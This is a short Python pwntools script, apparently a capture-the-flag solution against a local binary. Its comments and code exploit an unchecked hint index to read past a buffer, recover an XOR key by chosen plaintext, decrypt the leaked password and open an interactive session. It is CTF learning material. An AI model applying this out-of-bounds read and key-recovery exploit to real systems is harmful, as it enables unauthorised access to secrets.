from pwn import *

# password buffer is 32 chars
# input buffer is 32 chars
# key is calculated using rng

# password file is opened and 31 strings are read into it
# assuming the \0 is not read
# this password is crypted with the key - crypting isj ust an xor

# scanf("%31s", input) -- fine

# can get hints anywhere in memory it seems as long as the number is > 0
# negative number breaks hint loop


# hypothesis
# read past hints buffer to read password
# password will have been xor'd with a random key
# read key data
# read the password bytes and brute for xor to get 

# fix to hypothesis - cannot find key data for some reason? easier to find
# my own input that was encrypted. chosen plaintext -> just xor to find key

context.log_level = 'error'
binary = './chall'
elf = ELF(binary)
context.binary = binary
context.arch = 'amd64'
# libc = ELF('./libc.so.6)
# libc = context.binary.libv

p = process(binary)

# through GDB looks like...
# 0: Hint1:T
# 1: Hint2:S
# 2: Hint3:G
# ...
# 10:
# ...
# 41
# reading size 8 because hints[3][8]
# read 4, 5, 6, 7 (4 * 8 = 32)

# find key by xor my input with stored input at 8

p.recvuntil(b"Enter the password > ")
p.sendline(b"A"*8)

prompt = b"Enter a hint number (0~2) > "

encrypted_password = b""
for i in range(4):
    p.recvuntil(prompt)
    p.sendline(str(4 + i))
    encrypted_password += p.recvline().strip().strip(b"\n")

# get encrypted input
p.recvuntil(prompt)
p.sendline(b"8")
encrypted_input = p.recvline().strip().strip(b"\n")

key = bytes([a ^ b for (a, b) in zip(encrypted_input, b"A"*8)])
password = bytes([encrypted_password[i] ^ key[i % 8] for i in range(len(encrypted_password))]).strip(b"\x00")

p.sendlineafter(prompt, '-1')
p.sendlineafter(b"Enter the password > ", password)

p.interactive()

